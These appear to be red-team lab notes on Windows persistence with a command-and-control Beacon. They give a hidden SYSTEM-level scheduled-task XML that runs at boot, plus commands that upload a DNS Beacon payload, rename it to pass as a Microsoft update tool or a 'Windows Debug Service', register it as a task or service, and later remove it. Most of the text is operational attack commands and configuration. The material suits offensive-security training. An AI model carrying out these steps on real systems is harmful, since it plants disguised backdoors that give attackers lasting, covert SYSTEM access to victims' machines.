- Save the following XML template to the Attacker Desktop (e.g. C:\Payloads\task.xml)

```xml
<Task xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
<Triggers>
    <BootTrigger>
        <Enabled>true</Enabled>
    </BootTrigger>
</Triggers>
<Principals>
    <Principal>
        <UserId>NT AUTHORITY\SYSTEM</UserId>
        <RunLevel>HighestAvailable</RunLevel>
    </Principal>
</Principals>
<Settings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
</Settings>
<Actions>
    <Exec>
        <Command>"C:\Program Files\Microsoft Update Health Tools\updater.exe"</Command>
    </Exec>
</Actions>
</Task>
```

- Change Beacon's current working directory.
    
    1. cd C:\Program Files\Microsoft Update Health Tools
-  Upload a DNS Beacon payload.
    
    1. upload C:\Payloads\dns_x64.exe
-  Rename the payload to something you think will help it to blend in.
    
    1. mv dns_x64.exe updater.exe
-  Create the scheduled task.
	- schtaskscreate \Microsoft\Windows\WindowsUpdate\Updater XML CREATE

>A file dialogue window will appear for you to select the XML file.

- Delete the task.
	1. schtasksdelete \Microsoft\Windows\WindowsUpdate\Updater TASK
`
### Windows Services
- Change Beacon's current working directory.
    
    1. cd C:\Windows\System32
-  Upload a DNS Beacon service payload.
    
    1. upload C:\Payloads\dns_x64.svc.exe
-  Rename the payload to something you think will help it to blend in.
    
    1. mv dns_x64.svc.exe debug_svc.exe
-  Create the service.
    
    1. sc_create dbgsvc "Debug Service" C:\Windows\System32\debug_svc.exe "Windows Debug Service" 0 2 3
-  Reboot [Workstation 1](https://labclient.labondemand.com/Instructions/a126970d-71bf-4cde-ab34-c63d28b0c4b1?showWhenStarting=1#) and a new SYSTEM Beacon should appear.
    
-  Delete the service.
    
    1. sc_delete dbgsvc